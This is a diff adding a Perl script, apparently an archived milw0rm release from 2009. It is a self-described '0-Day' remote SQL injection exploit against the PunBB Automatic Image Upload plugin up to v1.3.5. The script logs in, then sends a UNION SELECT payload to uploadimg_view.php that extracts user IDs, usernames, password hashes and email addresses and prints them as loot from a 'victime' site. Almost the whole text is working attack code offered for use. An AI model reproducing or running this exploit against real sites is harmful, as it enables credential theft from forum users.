@@ -1,0 +1,112 @@
+#!/usr/bin/perl
+#[0-Day] PunBB Automatic Image Upload <= v1.3.5 Remote SQL Injection Exploit
+#Coded By Dante90, WaRWolFz Crew
+#Bug Discovered By: Dante90, WaRWolFz Crew
+#Works only if '$Allow_Stats[] = "[USERGROUP]";' is not commented in "uploadimg_config.php" [FIND LINE: 75]. Example:
+#//$Allow_Stats[] = "Members"; => $Allow_Stats[] = "Members";
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use strict;
+
+my ($UserName,$PassWord,$ID) = @ARGV;
+
+if(@ARGV < 3){
+    &usage();
+    exit();
+}
+
+my $Message = "";
+my $Host = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link
+my $Referrer = "http://www.warwolfz.com/";
+
+my $Cookies = new HTTP::Cookies;
+my $UserAgent = new LWP::UserAgent(
+            agent => 'Mozilla/5.0',
+            max_redirect => 0,
+            cookie_jar => $Cookies,
+        ) or die $!;
+
+sub Login(){
+    my $Login = $UserAgent->post($HostName.'/login.php?action=in',
+                [
+                    form_sent        => '1',
+                    redirect_url    => 'index.php',
+                    req_username    => $UserName,
+                    req_password    => $PassWord,
+                    login => 'Login',
+                ]) || die $!;
+
+    if($Login->content =~ /Logged in /i){
+        return 1;
+    }else{
+        return 0;
+    }
+}
+
+sub SQL_Injection{
+    my ($User_ID) = @_;
+    return "./uploadimg_view.php?view=gallery&id=-1 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),id,username,password,email) FROM users WHERE id=${User_ID}";
+}
+
+if (Login() == 1){
+    $Message = " * Logged in as: " . $UserName;
+}elsif (Login() == 0){
+    $Message = " * Login Failed.";
+}
+
+my $Get = $UserAgent->get($HostName.SQL_Injection($ID));
+
+if($Get->content =~ /([0-9]{1,10}) : ([a-zA-Z0-9-_.]{2,200}) : ([a-f0-9]{1,40}) : ([a-zA-Z0-9.@]{1,50})/i){
+    refresh($Message, $HostName, $1, $2, $3, $4);
+    print " * Exploit Successed                                  *\n";
+    print " ------------------------------------------------------\n\n";
+    system("pause");
+}else{
+    refresh($Message, $HostName, "", "", "", "");
+    print " * Error extracting sensible data.\n";
+    print " * Exploit Failed                                     *\n";
+    print " ------------------------------------------------------ \n\n";
+}
+
+
+sub usage{
+    system("cls");
+    {
+        print " \n [0-Day] PunBB Automatic Image Upload <= v1.3.5 Remote SQL Injection Exploit\n";
+        print " ------------------------------------------------------ \n";
+        print " * USAGE:                                             *\n";
+        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
+        print " * perl name_exploit.pl [username] [password] [id]    *\n";
+        print " ------------------------------------------------------ \n";
+        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
+        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
+        print " ------------------------------------------------------ \n";
+    };
+    exit;
+}
+
+sub refresh{
+    system("cls");
+    {
+        print " \n [0-Day] PunBB Automatic Image Upload <= v1.3.5 Remote SQL Injection Exploit\n";
+        print " ------------------------------------------------------ \n";
+        print " * USAGE:                                             *\n";
+        print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
+        print " * perl name_exploit.pl [username] [password] [id]    *\n";
+        print " ------------------------------------------------------ \n";
+        print " *         Powered By Dante90, WaRWolFz Crew          *\n";
+        print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
+        print " ------------------------------------------------------ \n";
+    };
+    print $_[0] ."\n";
+    print " * Victime Site: " . $_[1] . "\n";
+    print " * User ID: " . $_[2] . "\n";
+    print " * Username: " . $_[3] . "\n";
+    print " * Password: " . $_[4] . "\n";
+    print " * E-Mail: " . $_[5] . "\n";
+}
+
+#WaRWolFz Crew
+
+# milw0rm.com [2009-07-27]
